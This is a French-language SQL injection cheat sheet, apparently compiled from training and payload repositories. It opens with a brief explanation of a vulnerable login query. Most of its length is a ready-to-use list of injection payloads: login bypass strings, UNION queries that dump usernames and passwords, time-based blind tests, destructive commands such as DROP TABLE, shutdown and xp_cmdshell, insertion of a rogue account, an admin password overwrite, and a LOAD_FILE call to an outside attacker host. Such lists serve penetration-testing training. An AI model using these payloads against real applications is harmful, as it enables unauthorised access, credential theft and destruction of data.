## Introduction

### Qu'est ce que le SQL ?

Le SQL (*Structured Query Language*) est un langage informatique de **gestion de bases de données**. Il permet de manipuler et d'interroger des données stockées dans des tables et d'exécuter des opérations telles que la création, la mise à jour, la suppression et la recherche de données.

### Comment est formé le backend ?
Au plus classique (*Et le plus vulnérable entre autre*:): 

```sql
-- return
SELECT 
  (`password` = '$pass') is_valid_password
FROM users 
WHERE username = 'admin' 
LIMIT 1;
```
 
 On peut se demander: mais comment c'est vulnérable ?
 En fait, la variable `$pass`, est remplacé par un input de user.
 Voici ce qu'il se passe quand on met la variable `$pass` avec la *valeur* `Arty06`.

```sql
-- return
SELECT 
  (`password` = 'Arty06') is_valid_password
FROM users 
WHERE username = 'admin' 
LIMIT 1;
```

### Vulnérabilité
La vulnérabilité est tel que nous pouvons facilement sortir de *'l'input'*: 
En y injectant: `' OR '1`, nous avons:
```sql
-- return
SELECT 
  (`password` = '' OR '1') is_valid_password
FROM users 
WHERE username = 'admin' 
LIMIT 1;
```

Nous bypassons donc le *password*,et le tour est joué !

## Bypass/Payloads

Voici des listes qui vont vous permettre de bypasser certainesrestrictions,ainsi que des payloads d'injection:

### Commentaires

```sqlite
-- 
/**/
```
`--` Permet de mettre en commentaire tout ce qu'il le suit
`/**/` Permet de mettre en commentaire ce qui se trouve au mielieu

### SQlite version
```sqlite
select sqlite_version();
```

### BDD Structure
```sqlite
UNION SELECT sql FROM sqlite_master
UNION SELECT column_name FROM tab_name
```
Pour pouvoir se "balader" dans la BDD
Permet de voir comment sont ordonnés les tabs de la BDD
(A ne pas oublier d'adapter)

### "Injection Payload"
```sqlite
' OR '1'='1
' OR 1=1 --
' OR 1=1; --
' OR 1=1# 
'; DROP TABLE users; --
' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055' --
' UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055', '2' --
' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --
' AND (SELECT * FROM (SELECT(SLEEP(5-(IF(1=1,1,0))))))a) --
' AND (SELECT * FROM (SELECT(SLEEP(5-(IF(1=2,1,0))))))a) --
';exec xp_cmdshell 'cmd.exe' --
';shutdown --
';INSERT INTO users (username, password) VALUES ('hacker', '81dc9bdb52d04dc20036dbd8313ed055') --
';UPDATE users SET password='81dc9bdb52d04dc20036dbd8313ed055' WHERE username='admin' --
' AND (SELECT LOAD_FILE('\\\\attacker.example.com\\file.txt')) --
' AND (SELECT * FROM users WHERE username LIKE 'A%') --
' AND (SELECT * FROM users WHERE username LIKE 'A%' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055') --
' AND (SELECT * FROM users WHERE username='admin' AND password LIKE '81dc9bdb52d04dc20036dbd8313ed055%') --
' AND (SELECT * FROM users WHERE username='admin' AND password LIKE '81dc9bdb52d04dc20036dbd8313ed055%' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055') --
' AND (SELECT * FROM users WHERE username='admin' AND password LIKE '81dc9bdb52d04dc20036dbd8313ed055%' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055', '2') --
' AND 1=0 UNION ALL SELECT @@version --
' AND 1=0 UNION ALL SELECT @@datadir --
' AND 1=0 UNION ALL SELECT user() --
' AND 1=0 UNION ALL SELECT database() --
' AND 1=0 UNION ALL SELECT table_name FROM information_schema.tables --
' AND 1=0 UNION ALL SELECT column_name FROM information_schema.columns WHERE table_name='users' --
' AND 1=0 UNION ALL SELECT concat(username,':',password) FROM users --
' AND 1=0 UNION ALL SELECT concat_ws(':',username,password) FROM users --
' AND 1=0 UNION ALL SELECT group_concat(username,':',password) FROM users --
' AND 1=0 UNION ALL SELECT group_concat(username,':',password SEPARATOR ' | ') FROM users --
' AND 1=0 UNION ALL SELECT hex(group_concat(username,':',password SEPARATOR ' | ')) FROM users --
' AND 1=0 UNION ALL SELECT unhex(hex(group_concat(username,':',password SEPARATOR ' | '))) FROM users --
'-'
' '
'&'
'^'
'*'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
"-"
" "
"&"
"^"
"*"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
or 1=1
or 1=1--
or 1=1#
admin' --
admin' #
admin'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
==
=
'
' --
' #
' –
'--
'/*
'#
" --
" #
' and 1='1
' and a='a
 or 1=1
 or true
' or ''='
" or ""="
1′) and '1′='1–
' AND 1=0 UNION ALL SELECT '', '81dc9bdb52d04dc20036dbd8313ed055
" AND 1=0 UNION ALL SELECT "", "81dc9bdb52d04dc20036dbd8313ed055
 and 1=1
 and 1=1–
' and 'one'='one
' and 'one'='one–
' group by password having 1=1--
' group by userid having 1=1--
' group by username having 1=1--
 like '%'
 or 0=0 --
 or 0=0 #
 or 0=0 –
' or         0=0 #
' or 0=0 --
' or 0=0 #
' or 0=0 –
" or 0=0 --
" or 0=0 #
" or 0=0 –
%' or '0'='0
 or 1=1
 or 1=1--
 or 1=1/*
 or 1=1#
 or 1=1–
' or 1=1--
' or '1'='1
' or '1'='1'--
' or '1'='1'#
' or '1′='1
' or 1=1
' or 1=1 --
' or 1=1 –
' or 1=1--
' or 1=1;#
' or 1=1/*
' or 1=1#
' or 1=1–
') or '1'='1
') or '1'='1--
') or '1'='1'--
') or '1'='1'/*
') or '1'='1'#
') or ('1'='1
') or ('1'='1--
') or ('1'='1'--
') or ('1'='1'#
'or'1=1
'or'1=1′
" or "1"="1
" or "1"="1"--
" or "1"="1"#
" or 1=1
" or 1=1 --
" or 1=1 –
" or 1=1--
" or 1=1#
" or 1=1–
") or "1"="1
") or "1"="1"--
") or "1"="1"#
") or ("1"="1
") or ("1"="1"--
") or ("1"="1"#
) or '1′='1–
) or ('1′='1–
' or 1=1 LIMIT 1;#
'or 1=1 or ''='
"or 1=1 or ""="
' or 'a'='a
' or a=a--
' or a=a–
') or ('a'='a
" or "a"="a
") or ("a"="a
') or ('a'='a and hi") or ("a"="a
' or 'one'='one
' or 'one'='one–
' or uid like '%
' or uname like '%
' or userid like '%
' or user like '%
' or username like '%
' or 'x'='x
') or ('x'='x
" or "x"="x
' OR 'x'='x'#;
'=' 'or' and '=' 'or'
' UNION ALL SELECT 1, @@version;#
' UNION ALL SELECT system_user(),user();#
' UNION select table_schema,table_name FROM information_Schema.tables;#
admin' and substring(password/text(),1,1)='7
' and substring(password/text(),1,1)='7
' or 1=1 limit 1 -- -+
'="or'
```




###### Crédits
`YesWeHack Dojo pour les exemples`
`Paylaod all the things pour certains payloads`
`https://dojo-yeswehack.com/SQL-Injection/Training/Simple-Login-Bypass`
`https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md`
